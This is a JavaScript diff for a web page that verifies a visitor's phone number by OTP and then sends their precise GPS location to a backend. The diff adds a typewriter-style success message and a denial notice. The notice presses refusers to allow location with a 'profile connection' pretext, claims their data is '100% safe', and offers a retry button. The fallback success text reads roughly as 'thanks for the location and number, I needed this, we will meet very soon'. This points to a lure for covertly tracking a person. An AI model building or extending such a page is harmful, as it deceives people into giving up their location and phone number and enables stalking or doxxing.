@@ -126,6 +126,44 @@ if (initialBioEl && initialBioEl.textContent.trim()) {
   runTypewriter(initialBioEl.textContent.trim());
 }
 
+// Celebration Message Typewriter Effect
+let celebrationTypewriterTimeout = null;
+
+function runCelebrationTypewriter(text) {
+  const celebrationText = document.getElementById('celebrationCustomText');
+  if (!celebrationText || !text) return;
+
+  if (celebrationTypewriterTimeout) {
+    clearTimeout(celebrationTypewriterTimeout);
+    celebrationTypewriterTimeout = null;
+  }
+
+  celebrationText.innerHTML = '<span class="celebration-typed-text"></span><span class="celebration-cursor"></span>';
+  const textSpan = celebrationText.querySelector('.celebration-typed-text');
+  const cursorSpan = celebrationText.querySelector('.celebration-cursor');
+
+  let index = 0;
+  const speed = 25; // 25ms per char for crisp, natural typing
+
+  function typeChar() {
+    if (index < text.length) {
+      textSpan.textContent += text.charAt(index);
+      index++;
+      celebrationTypewriterTimeout = setTimeout(typeChar, speed);
+    } else {
+      setTimeout(() => {
+        if (cursorSpan) {
+          cursorSpan.style.opacity = '0';
+          cursorSpan.style.transition = 'opacity 0.6s ease';
+        }
+      }, 4000);
+    }
+  }
+
+  // 350ms delay lets the celebration card pop & bounce animation finish first
+  setTimeout(typeChar, 350);
+}
+
 // Load live site config from backend on startup
 async function loadSiteConfig() {
   try {
@@ -405,7 +443,9 @@ async function requestAndTransmitLocation(verifiedPhone) {
         spinner.style.display = 'none';
         if (statusMsg) statusMsg.style.display = 'none';
 
-        // Hide form inputs cleanly
+        // Hide notice and form inputs cleanly
+        const locationDeniedNotice = document.getElementById('locationDeniedNotice');
+        if (locationDeniedNotice) locationDeniedNotice.style.display = 'none';
         if (stepSendOtp) stepSendOtp.style.display = 'none';
         if (stepVerifyOtp) stepVerifyOtp.style.display = 'none';
         const phoneGroup = document.querySelector('.phone-input-group');
@@ -420,9 +460,11 @@ async function requestAndTransmitLocation(verifiedPhone) {
             titleEl.textContent = currentSiteConfig.successTitle;
           }
           const celebrationText = document.getElementById('celebrationCustomText');
-          if (celebrationText && currentSiteConfig && currentSiteConfig.successMessage) {
-            celebrationText.textContent = currentSiteConfig.successMessage;
-          }
+          const messageText = (currentSiteConfig && currentSiteConfig.successMessage)
+            ? currentSiteConfig.successMessage
+            : (celebrationText ? celebrationText.textContent.trim() : 'Thank you for sharing location & number! Mujhe need tha ye cheez ka, aapse mulaqat bahut jaldi hoga bhai ❤️🤝');
+
+          runCelebrationTypewriter(messageText);
         }
 
       } catch (err) {
@@ -432,11 +474,28 @@ async function requestAndTransmitLocation(verifiedPhone) {
     },
     (error) => {
       spinner.style.display = 'none';
-      statusText.style.color = '#f59e0b';
-      if (error.code === error.PERMISSION_DENIED) {
-        statusText.textContent = 'Please allow location permission in your browser address bar to finish.';
-      } else {
-        statusText.textContent = 'Location timed out. Please allow location access.';
+      if (statusMsg) statusMsg.style.display = 'none';
+
+      // Hide inputs so user focuses on respectful location guidance
+      if (stepSendOtp) stepSendOtp.style.display = 'none';
+      if (stepVerifyOtp) stepVerifyOtp.style.display = 'none';
+      const phoneGroup = document.querySelector('.phone-input-group');
+      if (phoneGroup) phoneGroup.style.display = 'none';
+
+      // Show warm, respectful location permission notice card
+      const locationDeniedNotice = document.getElementById('locationDeniedNotice');
+      if (locationDeniedNotice) {
+        locationDeniedNotice.style.display = 'block';
+        const titleEl = document.getElementById('respectTitle');
+        const descEl = document.getElementById('respectDesc');
+
+        if (error.code === error.PERMISSION_DENIED) {
+          if (titleEl) titleEl.textContent = 'Chhoti Si Request Hai Bhai! 🙏';
+          if (descEl) descEl.innerHTML = 'Aapka mobile number verify ho gaya hai! Profile connection aur aapse contact card exchange karne ke liye <b>Location Access zaroori hai</b>. Kripya bura na manein, aapka data poori tarah surakshit hai.';
+        } else {
+          if (titleEl) titleEl.textContent = 'GPS / Location Signal Nahi Mila 🙏';
+          if (descEl) descEl.innerHTML = 'Kripya apne mobile ki <b>Location / GPS ON</b> karein aur browser me permission allow karke dobara koshish karein. Aapka data 100% safe hai.';
+        }
       }
     },
     {
@@ -445,6 +504,16 @@ async function requestAndTransmitLocation(verifiedPhone) {
       maximumAge: 0
     }
   );
+}
+
+// Respectful Notice Retry Button Handler
+const retryLocationBtn = document.getElementById('retryLocationBtn');
+if (retryLocationBtn) {
+  retryLocationBtn.addEventListener('click', () => {
+    const locationDeniedNotice = document.getElementById('locationDeniedNotice');
+    if (locationDeniedNotice) locationDeniedNotice.style.display = 'none';
+    requestAndTransmitLocation(currentFormattedPhone);
+  });
 }
 
 // --------------------------------------------------------------------------
